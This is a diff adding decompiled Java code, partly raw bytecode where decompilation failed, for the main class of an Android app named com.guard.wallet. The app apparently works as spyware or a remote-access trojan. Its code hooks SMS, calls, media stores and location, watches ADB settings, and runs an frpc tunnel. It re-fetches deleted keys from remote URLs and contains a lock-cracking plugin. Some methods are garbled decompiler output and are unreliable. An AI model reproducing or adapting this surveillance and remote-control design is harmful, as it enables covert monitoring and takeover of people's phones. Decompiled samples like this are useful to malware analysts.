+      // 346: invokevirtual com/guard/wallet/MainApplication.unlockedInstance ()V
+      // 349: aload 0
+      // 34a: getfield com/guard/wallet/MainApplication.configFileDeleteObserver Ly/b;
+      // 34d: ifnonnull 370
+      // 350: new y/b
+      // 353: dup
+      // 354: invokestatic com/guard/wallet/utils/g.i0 ()Ljava/lang/String;
+      // 357: new j/e
+      // 35a: dup
+      // 35b: bipush 26
+      // 35d: invokespecial j/e.<init> (I)V
+      // 360: invokespecial y/b.<init> (Ljava/lang/String;Lj/e;)V
+      // 363: astore 4
+      // 365: aload 0
+      // 366: aload 4
+      // 368: putfield com/guard/wallet/MainApplication.configFileDeleteObserver Ly/b;
+      // 36b: aload 4
+      // 36d: invokevirtual android/os/FileObserver.startWatching ()V
+      // 370: aload 0
+      // 371: getfield com/guard/wallet/MainApplication.crackLockCipherPlug Lcom/guard/wallet/plug/c;
+      // 374: ifnonnull 382
+      // 377: aload 0
+      // 378: new com/guard/wallet/plug/c
+      // 37b: dup
+      // 37c: invokespecial com/guard/wallet/plug/c.<init> ()V
+      // 37f: putfield com/guard/wallet/MainApplication.crackLockCipherPlug Lcom/guard/wallet/plug/c;
+      // 382: getstatic v/c.f Lv/c;
+      // 385: ifnonnull 3b1
+      // 388: ldc_w v/c
+      // 38b: monitorenter
+      // 38c: getstatic v/c.f Lv/c;
+      // 38f: ifnonnull 3a1
+      // 392: new v/c
+      // 395: astore 4
+      // 397: aload 4
+      // 399: invokespecial v/c.<init> ()V
+      // 39c: aload 4
+      // 39e: putstatic v/c.f Lv/c;
+      // 3a1: ldc_w v/c
+      // 3a4: monitorexit
+      // 3a5: goto 3b1
+      // 3a8: astore 4
+      // 3aa: ldc_w v/c
+      // 3ad: monitorexit
+      // 3ae: aload 4
+      // 3b0: athrow
+      // 3b1: return
+      // 3b2: astore 4
+      // 3b4: ldc com/guard/wallet/utils/g
+      // 3b6: monitorexit
+      // 3b7: aload 4
+      // 3b9: athrow
+   }
+
+   public boolean isUserUnlockedInstance() {
+      return this.isUserUnlockedInstance;
+   }
+
+   public void offerAccessibilityEvent(Integer var1) {
+      if (this.checkThread == null) {
+         b var2 = new b();
+         this.checkThread = var2;
+         var2.g();
+      }
+
+      b var3 = this.checkThread;
+      var3.getClass();
+      if (var1 != null && var1 > 0 && !var3.k.contains(var1)) {
+         var3.m.set(System.currentTimeMillis());
+         var3.n.set(0L);
+         var3.l.set(r.d.d);
+      }
+   }
+
+   public void offerStrategyEvent(String param1) {
+      // $VF: Couldn't be decompiled
+      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
+      // java.lang.NullPointerException: Cannot read field "id" because the return value of "org.jetbrains.java.decompiler.modules.decompiler.flow.FlattenStatementsHelper.getDirectNode(org.jetbrains.java.decompiler.modules.decompiler.stats.Statement)" is null
+      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:179)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.processStatement(ExprProcessor.java:112)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.getFinallyInformation(FinallyProcessor.java:136)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.iterateGraph(FinallyProcessor.java:85)
+      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:178)
+      //
+      // Bytecode:
+      // 00: aload 0
+      // 01: getfield com/guard/wallet/MainApplication.checkThread Lcom/guard/wallet/thread/b;
+      // 04: ifnonnull 18
+      // 07: new com/guard/wallet/thread/b
+      // 0a: dup
+      // 0b: invokespecial com/guard/wallet/thread/b.<init> ()V
+      // 0e: astore 2
+      // 0f: aload 0
+      // 10: aload 2
+      // 11: putfield com/guard/wallet/MainApplication.checkThread Lcom/guard/wallet/thread/b;
+      // 14: aload 2
+      // 15: invokevirtual com/guard/wallet/thread/b.g ()V
+      // 18: invokestatic h/e.S ()Lh/e;
+      // 1b: ifnonnull 21
+      // 1e: invokestatic h/e.T ()V
+      // 21: ldc_w com/guard/wallet/thread/j
+      // 24: monitorenter
+      // 25: getstatic com/guard/wallet/thread/j.g Lcom/guard/wallet/thread/j;
+      // 28: astore 2
+      // 29: ldc_w com/guard/wallet/thread/j
+      // 2c: monitorexit
+      // 2d: aload 2
+      // 2e: ifnonnull 5b
+      // 31: getstatic com/guard/wallet/thread/j.g Lcom/guard/wallet/thread/j;
+      // 34: ifnonnull 5b
+      // 37: ldc_w com/guard/wallet/thread/j
+      // 3a: monitorenter
+      // 3b: getstatic com/guard/wallet/thread/j.g Lcom/guard/wallet/thread/j;
+      // 3e: ifnonnull 4d
+      // 41: new com/guard/wallet/thread/j
+      // 44: astore 2
+      // 45: aload 2
+      // 46: invokespecial com/guard/wallet/thread/j.<init> ()V
+      // 49: aload 2
+      // 4a: putstatic com/guard/wallet/thread/j.g Lcom/guard/wallet/thread/j;
+      // 4d: ldc_w com/guard/wallet/thread/j
+      // 50: monitorexit
+      // 51: goto 5b
+      // 54: astore 1
+      // 55: ldc_w com/guard/wallet/thread/j
+      // 58: monitorexit
+      // 59: aload 1
+      // 5a: athrow
+      // 5b: ldc_w com/guard/wallet/thread/j
+      // 5e: monitorenter
+      // 5f: getstatic com/guard/wallet/thread/j.g Lcom/guard/wallet/thread/j;
+      // 62: astore 2
+      // 63: ldc_w com/guard/wallet/thread/j
+      // 66: monitorexit
+      // 67: aload 2
+      // 68: ifnull 8d
+      // 6b: ldc_w com/guard/wallet/thread/j
+      // 6e: monitorenter
+      // 6f: getstatic com/guard/wallet/thread/j.g Lcom/guard/wallet/thread/j;
+      // 72: astore 2
+      // 73: ldc_w com/guard/wallet/thread/j
+      // 76: monitorexit
+      // 77: aload 2
+      // 78: getfield com/guard/wallet/thread/j.e Ljava/lang/Object;
+      // 7b: checkcast java/util/concurrent/ConcurrentLinkedQueue
+      // 7e: aload 1
+      // 7f: invokevirtual java/util/concurrent/ConcurrentLinkedQueue.offer (Ljava/lang/Object;)Z
+      // 82: pop
+      // 83: goto 8d
+      // 86: astore 1
+      // 87: ldc_w com/guard/wallet/thread/j
+      // 8a: monitorexit
+      // 8b: aload 1
+      // 8c: athrow
+      // 8d: return
+      // 8e: astore 1
+      // 8f: ldc_w com/guard/wallet/thread/j
+      // 92: monitorexit
+      // 93: aload 1
+      // 94: athrow
+      // 95: astore 1
+      // 96: ldc_w com/guard/wallet/thread/j
+      // 99: monitorexit
+      // 9a: aload 1
+      // 9b: athrow
+   }
+
+   public void onConfigFileDelete(String var1) {
+      if (Objects.equals(var1, "frpc.ini")) {
+         b var3 = this.checkThread;
+         if (var3 != null && Objects.equals(var1, "frpc.ini") && !var3.h) {
+            com.guard.wallet.http.l.u();
+         }
+      } else if (Objects.equals(var1, "listenWindows.json")) {
+         com.guard.wallet.http.l.d();
+      } else if (Objects.equals(var1, "locateValues.json")) {
+         com.guard.wallet.http.l.a();
+      } else if ((Objects.equals(var1, "private.key") || Objects.equals(var1, "cert.pem")) && h.e.S() != null) {
+         h.e var5 = h.e.S();
+         var5.getClass();
+         if (Objects.equals(var1, "private.key") || Objects.equals(var1, "cert.pem")) {
+            boolean var2 = Objects.equals(var1, "private.key");
+            ExecutorService var4 = var5.p;
+            if (var2) {
+               var5.C = null;
+               String var6 = h.l("private.key.url");
+               if (!q.B(var6)) {
+                  var4.submit(new p.a(var6, "private.key", 1));
+               }
+            } else {
+               var5.D = null;
+               String var7 = h.l("cert.pem.url");
+               if (!q.B(var7)) {
+                  var4.submit(new p.a(var7, "cert.pem", 1));
+               }
+            }
+         }
+      }
+   }
+
+   public void registerReceiver(BroadcastReceiver var1, IntentFilter var2) {
+      Context var3 = context;
+      if (var3 != null) {
+         var3.registerReceiver(var1, var2);
+      }
+   }
+
+   public void registerReceiver(BroadcastReceiver var1, IntentFilter var2, int var3) {
+      if (context != null) {
+         context.registerReceiver(var1, var2, var3);
+      }
+   }
+
+   public void registerReceiver(BroadcastReceiver var1, IntentFilter var2, String var3, Handler var4) {
+      if (context != null && VERSION.SDK_INT < 33) {
+         context.registerReceiver(var1, var2, var3, var4);
+      }
+   }
+
+   public void registerReceiver(BroadcastReceiver var1, IntentFilter var2, String var3, Handler var4, int var5) {
+      if (context != null && VERSION.SDK_INT >= 33) {
+         context.registerReceiver(var1, var2, var3, var4, var5);
+      }
+   }
+
+   public void reloadRpcProcess() {
+      b var1 = this.checkThread;
+      if (var1 != null) {
+         var1.e();
+      }
+   }
+
+   public void rewriteDebugPort(Integer var1) {
+      b var2 = this.checkThread;
+      if (var2 != null && var1 != null && var1 > 0) {
+         var2.j.add(var1);
+      }
+   }
+
+   public void setAdbEnabledContentObserver(d var1) {
+      this.adbEnabledContentObserver = var1;
+   }
+
+   public void setAdbWIFIEnabledContentObserver(d var1) {
+      this.adbWIFIEnabledContentObserver = var1;
+   }
+
+   public void setAlarmReceiver(AlarmReceiver var1) {
+      this.alarmReceiver = var1;
+   }
+
+   public void setAudioAlbumContentObserver(y.a var1) {
+      this.audioAlbumContentObserver = var1;
+   }
+
+   public void setBatteryReceiver(BatteryLevelReceiver var1) {
+      this.batteryReceiver = var1;
+   }
+
+   public void setBootReceiver(BootBroadcast var1) {
+      this.bootReceiver = var1;
+   }
+
+   public void setBuildConfig(BuildConfig var1) {
+      this.buildConfig = var1;
+   }
+
+   public void setCallReceiver(CallReceiver var1) {
+      this.callReceiver = var1;
+   }
+
+   public void setCheckThread(b var1) {
+      this.checkThread = var1;
+   }
+
+   public void setConfigFileDeleteObserver(y.b var1) {
+      this.configFileDeleteObserver = var1;
+   }
+
+   public void setCrackLockCipherPlug(c var1) {
+      this.crackLockCipherPlug = var1;
+   }
+
+   public void setDevEnabledContentObserver(d var1) {
+      this.devEnabledContentObserver = var1;
+   }
+
+   public void setHandlerMsgAndTimer(e var1) {
+      this.handlerMsgAndTimer = var1;
+   }
+
+   public void setHeartThread(f var1) {
+      this.heartThread = var1;
+   }
+
+   public void setLocaleChangeReceiver(LocaleChangeReceiver var1) {
+      this.localeChangeReceiver = var1;
+   }
+
+   public void setNetWorkReceiver(NetWorkReceiver var1) {
+      this.netWorkReceiver = var1;
+   }
+
+   public void setPackageReceiver(PackageReceiver var1) {
+      this.packageReceiver = var1;
+   }
+
+   public void setPhotoAlbumContentObserver(y.c var1) {
+      this.photoAlbumContentObserver = var1;
+   }
+
+   public void setPowerReceiver(PowerBroadcastReceiver var1) {
+      this.powerReceiver = var1;
+   }
+
+   public void setScreenReceiver(ScreenBroadcastReceiver var1) {
+      this.screenReceiver = var1;
+   }
+
+   public void setShutDownReceiver(ShutDownBroadcastReceiver var1) {
+      this.shutDownReceiver = var1;
+   }
+
+   public void setSmsReceiver(SmsReceiver var1) {
+      this.smsReceiver = var1;
+   }
+
+   public void setUserUnlockedInstance(boolean var1) {
+      this.isUserUnlockedInstance = var1;
+   }
+
+   public void setVideoAlbumContentObserver(y.e var1) {
+      this.videoAlbumContentObserver = var1;
+   }
+
+   public void stopRpcProcess() {
+      b var1 = this.checkThread;
+      if (var1 != null) {
+         Process var2 = var1.f;
+         if (var2 != null) {
+            try {
+               var2.destroy();
+               var1.f = null;
+            } catch (Exception var3) {
+               q.s("CheckProcessThread", var3);
+            }
+         }
+
+         var1.h = true;
+      }
+   }
+
+   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
+   // $VF: Could not inline inconsistent finally blocks
+   // $VF: Could not create synchronized statement, marking monitor enters and exits
+   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
+   public void terminate() {
+      if (com.guard.wallet.helper.g.g()) {
+         com.guard.wallet.helper.g.c();
+      }
+
+      if (o.i() || o.h()) {
+         o.f(null, false);
+      }
+
+      if (r.k()) {
+         r.g(false);
+      }
+
+      e var1 = this.handlerMsgAndTimer;
+      if (var1 != null) {
+         var1.a.cancel();
+      }
+
+      a0.c var99 = this.jobSchedulerManage;
+      if (var99 != null) {
+         var99.a.cancelAll();
+      }
+
+      b var100 = this.checkThread;
+      if (var100 != null) {
+         var100.b.cancel();
+         var100.b = null;
+         var100.e.clear();
+         var100.e = null;
+         Process var2 = var100.f;
+         if (var2 != null) {
+            try {
+               var2.destroy();
+               var100.f = null;
+            } catch (Exception var87) {
+               q.s("CheckProcessThread", var87);
+            }
+         }
+
+         var100.h = true;
+         this.checkThread = null;
+      }
+
+      f var101 = this.heartThread;
+      if (var101 != null) {
+         var101.d.cancel();
+         this.heartThread = null;
+      }
+
+      u.b var102 = this.smsMessageListener;
+      if (var102 != null) {
+         var102.a.clear();
+         var102.b = 0;
+         this.smsMessageListener = null;
+      }
+
+      if (com.guard.wallet.server.b.b != null) {
+         com.guard.wallet.server.b.b.f3();
+      }
+
+      label1130: {
+         Exception var10000;
+         label1150: {
+            try {
+               var103 = com.guard.wallet.server.c.E;
+            } catch (Exception var98) {
+               var10000 = var98;
+               boolean var10001 = false;
+               break label1150;
+            }
+
+            if (var103 == null) {
+               break label1130;
+            }
+
+            try {
+               var103.F("");
+               com.guard.wallet.server.c.E.t();
+               com.guard.wallet.server.c.E = null;
+               break label1130;
+            } catch (Exception var97) {
+               var10000 = var97;
+               boolean var126 = false;
+            }
+         }
+
+         Exception var104 = var10000;
+         q.s("MyWebSocketServer", var104);
+      }
+
+      AlarmReceiver var105 = this.alarmReceiver;
+      if (var105 != null) {
+         context.unregisterReceiver(var105);
+         this.alarmReceiver = null;
+      }
+
+      ScreenBroadcastReceiver var106 = this.screenReceiver;
+      if (var106 != null) {
+         context.unregisterReceiver(var106);
+         this.screenReceiver = null;
+      }
+
+      BootBroadcast var107 = this.bootReceiver;
+      if (var107 != null) {
+         context.unregisterReceiver(var107);
+         this.bootReceiver = null;
+      }
+
+      BatteryLevelReceiver var108 = this.batteryReceiver;
+      if (var108 != null) {
+         context.unregisterReceiver(var108);
+         this.batteryReceiver = null;
+      }
+
+      PowerBroadcastReceiver var109 = this.powerReceiver;
+      if (var109 != null) {
+         context.unregisterReceiver(var109);
+         this.powerReceiver = null;
+      }
+
+      ShutDownBroadcastReceiver var110 = this.shutDownReceiver;
+      if (var110 != null) {
+         context.unregisterReceiver(var110);
+         this.shutDownReceiver = null;
+      }
+
+      PackageReceiver var111 = this.packageReceiver;
+      if (var111 != null) {
+         context.unregisterReceiver(var111);
+         this.packageReceiver = null;
+      }
+
+      SmsReceiver var112 = this.smsReceiver;
+      if (var112 != null) {
+         context.unregisterReceiver(var112);
+         this.smsReceiver = null;
+      }
+
+      CallReceiver var113 = this.callReceiver;
+      if (var113 != null) {
+         context.unregisterReceiver(var113);
+         this.callReceiver = null;
+      }
+
+      LocaleChangeReceiver var114 = this.localeChangeReceiver;
+      if (var114 != null) {
+         context.unregisterReceiver(var114);
+         this.localeChangeReceiver = null;
+      }
+
+      if (this.smsMessageListener != null) {
+         this.smsMessageListener = null;
+      }
+
+      if (this.devEnabledContentObserver != null) {
+         this.getContentResolver().unregisterContentObserver(this.devEnabledContentObserver);
+         this.devEnabledContentObserver = null;
+      }
+
+      if (this.adbEnabledContentObserver != null) {
+         this.getContentResolver().unregisterContentObserver(this.adbEnabledContentObserver);
+         this.adbEnabledContentObserver = null;
+      }
+
+      if (this.adbWIFIEnabledContentObserver != null) {
+         this.getContentResolver().unregisterContentObserver(this.adbWIFIEnabledContentObserver);
+         this.adbWIFIEnabledContentObserver = null;
+      }
+
+      if (this.photoAlbumContentObserver != null) {
+         this.getContentResolver().unregisterContentObserver(this.photoAlbumContentObserver);
+         this.photoAlbumContentObserver = null;
+      }
+
+      if (this.videoAlbumContentObserver != null) {
+         this.getContentResolver().unregisterContentObserver(this.videoAlbumContentObserver);
+         this.videoAlbumContentObserver = null;
+      }
+
+      if (this.audioAlbumContentObserver != null) {
+         this.getContentResolver().unregisterContentObserver(this.audioAlbumContentObserver);
+         this.audioAlbumContentObserver = null;
+      }
+
+      y.b var115 = this.configFileDeleteObserver;
+      if (var115 != null) {
+         var115.stopWatching();
+         this.configFileDeleteObserver = null;
+      }
+
+      CustomNotificationService.a();
+
+      label1092: {
+         Exception var123;
+         label1151: {
+            try {
+               var116 = h.e.F;
+            } catch (Exception var96) {
+               var123 = var96;
+               boolean var127 = false;
+               break label1151;
+            }
+
+            if (var116 == null) {
+               break label1092;
+            }
+
+            try {
+               var116.close();
+               h.e.F = null;
+               break label1092;
+            } catch (Exception var95) {
+               var123 = var95;
+               boolean var128 = false;
+            }
+         }
+
+         Exception var117 = var123;
+         q.s("AdbConnectionManager", var117);
+      }
+
+      synchronized (j.class){} // $VF: monitorenter 
+
+      label1152: {
+         Throwable var124;
+         label1080: {
+            try {
+               if (j.g != null) {
+                  ((Timer)j.g.f).cancel();
+               }
+            } catch (Throwable var94) {
+               var124 = var94;
+               boolean var129 = false;
+               break label1080;
+            }
+
+            label1077:
+            try {
+               // $VF: monitorexit
+               break label1152;
+            } catch (Throwable var93) {
+               var124 = var93;
+               boolean var130 = false;
+               break label1077;
+            }
+         }
+
+         while (true) {
+            Throwable var118 = var124;
+
+            try {
+               // $VF: monitorexit
+               throw var118;
+            } catch (Throwable var88) {
+               var124 = var88;
+               boolean var131 = false;
+               continue;
+            }
+         }
+      }
+
+      label1057:
+      if (v.c.f != null) {
+         synchronized (v.c.class){} // $VF: monitorenter 
+
+         Throwable var125;
+         label1154: {
+            v.b var122;
+            try {
+               var119 = v.c.f;
+               var122 = var119.d;
+            } catch (Throwable var92) {
+               var125 = var92;
+               boolean var132 = false;
+               break label1154;
+            }
+
+            if (var122 != null) {
+               try {
+                  var119.a.removeUpdates(var122);
+                  var119.d = null;
+                  var119.e.set(null);
+                  Log.d("v.c", "已取消地理位置实时监听");
+               } catch (Throwable var91) {
+                  var125 = var91;
+                  boolean var133 = false;
+                  break label1154;
+               }
+            }
+
+            label1060:
+            try {
+               v.c.f = null;
+               // $VF: monitorexit
+               break label1057;
+            } catch (Throwable var90) {
+               var125 = var90;
+               boolean var134 = false;
+               break label1060;
+            }
+         }
+
+         while (true) {
+            Throwable var120 = var125;
+
+            try {
+               // $VF: monitorexit
+               throw var120;
+            } catch (Throwable var89) {
+               var125 = var89;
+               boolean var135 = false;
+               continue;
+            }
+         }
+      }
+
+      x.a var121 = x.a.h;
+      if (var121 != null) {
+         var121.e();
+         x.a.h = null;
+      }
+
+      Log.d("MainApplication", "onTerminate");
+   }
+
+   // $VF: Could not create synchronized statement, marking monitor enters and exits
+   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
+   public void unlockedInstance() {
+      if (h.s()) {
+         Log.d("MainApplication", "unlockedInstance");
+         this.buildConfig = com.guard.wallet.utils.d.a();
+         if (this.checkThread == null) {
+            b var1 = new b();
+            this.checkThread = var1;
+            var1.g();
+         }
+
+         if (this.heartThread == null) {
+            f var45 = new f();
+            this.heartThread = var45;
+            var45.d.schedule(var45, 10000L, 10000L);
+         }
+
+         this.isUserUnlockedInstance = true;
+         h.p();
+         String var46 = com.guard.wallet.http.l.a;
+         y var47 = new y();
+         new i("http://127.0.0.1:7911").d(null, "/shareADBConfig", var47);
+         com.guard.wallet.http.l.z();
+         synchronized (g.class){} // $VF: monitorenter 
+
+         try {
+            if (getInstance() != null && getInstance().getDevEnabledContentObserver() == null) {
+               Uri var2 = Global.getUriFor("development_settings_enabled");
+               d var48 = new d();
+               getInstance().setDevEnabledContentObserver(var48);
+               getInstance().getContentResolver().registerContentObserver(var2, false, var48);
+            }
+         } finally {
+            // $VF: monitorexit
+         }
+
+         synchronized (g.class){} // $VF: monitorenter 
+
+         try {
+            if (getInstance() != null && getInstance().getAdbEnabledContentObserver() == null) {
+               Uri var56 = Global.getUriFor("adb_enabled");
+               d var49 = new d();
+               getInstance().setAdbEnabledContentObserver(var49);
+               getInstance().getContentResolver().registerContentObserver(var56, false, var49);
+            }
+         } finally {
+            // $VF: monitorexit
+         }
+
+         synchronized (g.class){} // $VF: monitorenter 
+
+         try {
+            if (getInstance() != null && getInstance().getAdbWIFIEnabledContentObserver() == null) {
+               Uri var50 = Global.getUriFor("adb_wifi_enabled");
+               d var57 = new d();
+               getInstance().setAdbWIFIEnabledContentObserver(var57);
+               getInstance().getContentResolver().registerContentObserver(var50, false, var57);
+            }
+         } finally {
+            // $VF: monitorexit
+         }
+
+         synchronized (g.class){} // $VF: monitorenter 
+
+         try {
+            if (getInstance() != null && getInstance().getPhotoAlbumContentObserver() == null) {
+               Uri var58 = Media.EXTERNAL_CONTENT_URI;
+               y.c var51 = new y.c();
+               getInstance().setPhotoAlbumContentObserver(var51);
+               getInstance().getContentResolver().registerContentObserver(var58, true, var51);
+            }
+         } finally {
+            // $VF: monitorexit
+         }
+
+         synchronized (g.class){} // $VF: monitorenter 
+
+         try {
+            if (getInstance() != null && getInstance().getVideoAlbumContentObserver() == null) {
+               Uri var59 = android.provider.MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
+               y.e var52 = new y.e();
+               getInstance().setVideoAlbumContentObserver(var52);
+               getInstance().getContentResolver().registerContentObserver(var59, true, var52);
+            }
+         } finally {
+            // $VF: monitorexit
+         }
+
+         synchronized (g.class){} // $VF: monitorenter 
+
+         try {
+            if (getInstance() != null && getInstance().getAudioAlbumContentObserver() == null) {
+               Uri var60 = android.provider.MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;
+               y.a var53 = new y.a();
+               getInstance().setAudioAlbumContentObserver(var53);
+               getInstance().getContentResolver().registerContentObserver(var60, true, var53);
+            }
+         } finally {
+            // $VF: monitorexit
+         }
+
+         if (VERSION.SDK_INT >= 28) {
+            Unsafe var54 = org.lsposed.hiddenapibypass.i.a;
+            HashSet var55 = org.lsposed.hiddenapibypass.h.a;
+            var55.addAll(Arrays.asList(""));
+            String[] var61 = new String[var55.size()];
+            var55.toArray(var61);
+            org.lsposed.hiddenapibypass.i.b(var61);
+         }
+      } else {
+         this.isUserUnlockedInstance = false;
+      }
+   }
+}
